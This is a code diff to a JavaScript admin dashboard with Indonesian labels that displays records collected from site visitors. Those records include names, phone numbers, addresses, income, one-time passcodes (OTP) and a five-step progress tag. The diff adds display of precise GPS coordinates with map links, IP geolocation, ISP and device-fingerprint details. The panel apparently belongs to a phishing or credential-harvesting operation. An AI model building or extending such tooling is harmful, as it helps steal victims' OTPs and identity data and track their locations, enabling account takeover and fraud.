@@ -19,10 +19,16 @@
     phone: 'Nomor HP', full_name: 'Nama', age: 'Umur', birth_date: 'Tgl lahir',
     gender: 'Gender', address: 'Alamat', city: 'Kota', province: 'Provinsi',
     postal_code: 'Kode pos', occupation: 'Pekerjaan', income: 'Pendapatan',
-    otp: 'OTP', user_agent: 'Perangkat', page_url: 'URL', referrer: 'Referrer',
+    otp: 'OTP',
+    geo_address: 'Alamat GPS', geo_city: 'Kota (GPS)', geo_province: 'Provinsi (GPS)',
+    geo_postcode: 'Kode pos (GPS)', geo_source: 'Sumber lokasi',
+    ip: 'IP', ip_city: 'Kota (IP)', ip_region: 'Region (IP)',
+    ip_country: 'Negara (IP)', ip_isp: 'ISP', ip_lat: 'Lat (IP)', ip_lon: 'Lon (IP)',
+    language: 'Bahasa', platform: 'Platform', device_memory: 'RAM',
+    cores: 'Core CPU', touch: 'Layar sentuh',
+    user_agent: 'Perangkat', page_url: 'URL', referrer: 'Referrer',
     screen: 'Layar', timezone: 'Zona waktu', session_id: 'Sesi'
   };
-  const SKIP = ['id', 'created_at', 'updated_at', 'email', 'password', 'step'];
 
   document.getElementById('btnLogin').addEventListener('click', login);
   document.getElementById('aPass').addEventListener('keydown', (e) => {
@@ -84,7 +90,7 @@
       .limit(300);
 
     if (error) {
-      list.innerHTML = '<div class="empty">Gagal memuat: ' + error.message + '</div>';
+      list.innerHTML = '<div class="empty">Gagal memuat: ' + esc(error.message) + '</div>';
       return;
     }
     rows = data || [];
@@ -113,7 +119,7 @@
     const term = q.value.trim().toLowerCase();
     const view = term
       ? rows.filter((r) =>
-          [r.email, r.full_name, r.phone, r.city, r.occupation]
+          [r.email, r.full_name, r.phone, r.city, r.occupation, r.ip, r.ip_city]
             .filter(Boolean).join(' ').toLowerCase().includes(term))
       : rows;
 
@@ -122,7 +128,8 @@
     stat.textContent = rows.length + ' total · ' + todayCount + ' hari ini';
 
     if (!view.length) {
-      list.innerHTML = '<div class="empty">' + (term ? 'Tidak ada yang cocok.' : 'Belum ada data masuk.') + '</div>';
+      list.innerHTML = '<div class="empty">' +
+        (term ? 'Tidak ada yang cocok.' : 'Belum ada data masuk.') + '</div>';
       return;
     }
 
@@ -147,6 +154,7 @@
 
       const rowsBox = document.createElement('div');
       rowsBox.className = 'rows';
+
       Object.keys(LABELS).forEach((k) => {
         if (!r[k]) return;
         const row = document.createElement('div');
@@ -154,12 +162,24 @@
         row.innerHTML = '<span class="k">' + LABELS[k] + '</span><span class="v">' + esc(String(r[k])) + '</span>';
         rowsBox.append(row);
       });
-      card.append(rowsBox);
+
+      if (r.lat && r.lon) {
+        const g = document.createElement('div');
+        g.className = 'row';
+        g.innerHTML = '<span class="k">Koordinat GPS</span><span class="v">' +
+          Number(r.lat).toFixed(6) + ', ' + Number(r.lon).toFixed(6) +
+          ' (\u00b1' + Math.round(r.accuracy || 0) + ' m) \u00b7 ' +
+          '<a href="https://www.google.com/maps?q=' + r.lat + ',' + r.lon +
+          '" target="_blank" rel="noopener">buka peta</a></span>';
+        rowsBox.append(g);
+      }
 
       const tag = document.createElement('span');
       tag.className = 'stepTag';
       tag.textContent = 'tahap ' + (r.step || 1) + ' / 5';
       rowsBox.append(tag);
+
+      card.append(rowsBox);
 
       const acts = document.createElement('div');
       acts.className = 'cardActs';
